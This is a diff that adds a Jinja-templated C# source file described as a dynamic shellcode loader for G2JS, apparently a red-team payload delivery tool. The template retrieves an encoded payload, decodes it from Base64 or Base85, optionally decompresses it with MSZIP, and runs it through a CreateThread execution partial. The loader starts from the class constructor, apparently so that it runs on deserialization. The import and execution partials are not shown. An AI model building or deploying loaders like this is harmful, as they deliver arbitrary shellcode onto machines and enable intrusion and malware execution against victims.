@@ -1,0 +1,93 @@
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.IO;
+
+/*
+    Dynamic Shellcode Loader for G2JS (Modular)
+*/
+
+namespace ShellcodeLoader
+{
+    public class Program
+    {
+        // ---------------------------------------------------------
+        // Imports (P/Invoke)
+        // ---------------------------------------------------------
+        {% include 'partials/pinvoke_core.cs.j2' %}
+        {% if compression == 'mszip' %}
+        {% include 'partials/pinvoke_mszip.cs.j2' %}
+        {% endif %}
+
+        // ---------------------------------------------------------
+        // Helpers
+        // ---------------------------------------------------------
+        {% include 'partials/helper_debug.cs.j2' %}
+        
+        {% if encoding == 'base85' %}
+        {% include 'partials/helper_base85.cs.j2' %}
+        {% endif %}
+
+        {% if compression == 'mszip' %}
+        {% include 'partials/helper_mszip.cs.j2' %}
+        {% endif %}
+
+        // ---------------------------------------------------------
+        // Constructor (Entry Point)
+        // ---------------------------------------------------------
+        public Program()
+        {
+            try
+            {
+                Log("Loader initialized.");
+                
+                // 1. Retrieval Strategy
+                // Defines: string fullPayloadStr
+                {% include 'partials/retrieve_env.cs.j2' %}
+
+                // 2. Transformation Pipeline
+                // Input: fullPayloadStr
+                // Output: byte[] shellcode
+                byte[] shellcode = null;
+                try 
+                {
+                    {% if encoding == 'base85' %}
+                    Log("Decoding Base85...");
+                    shellcode = DecodeBase85(fullPayloadStr);
+                    {% else %}
+                    Log("Decoding Base64...");
+                    shellcode = Convert.FromBase64String(fullPayloadStr);
+                    {% endif %}
+                }
+                catch (Exception e)
+                {
+                    Log("Decoding failed: " + e.Message);
+                    return;
+                }
+
+                {% if compression == 'mszip' %}
+                try
+                {
+                    Log("Decompressing (MSZIP)...");
+                    shellcode = DecompressMSZIP(shellcode);
+                    if (shellcode == null) throw new Exception("Decompression returned null.");
+                    Log("Decompressed size: " + shellcode.Length);
+                }
+                catch (Exception e)
+                {
+                    Log("Decompression failed: " + e.Message);
+                    return;
+                }
+                {% endif %}
+
+                // 3. Execution Strategy
+                // Input: byte[] shellcode
+                {% include 'partials/exec_createthread.cs.j2' %}
+            }
+            catch (Exception ex)
+            {
+                Log("FATAL ERROR: " + ex.ToString());
+            }
+        }
+    }
+}
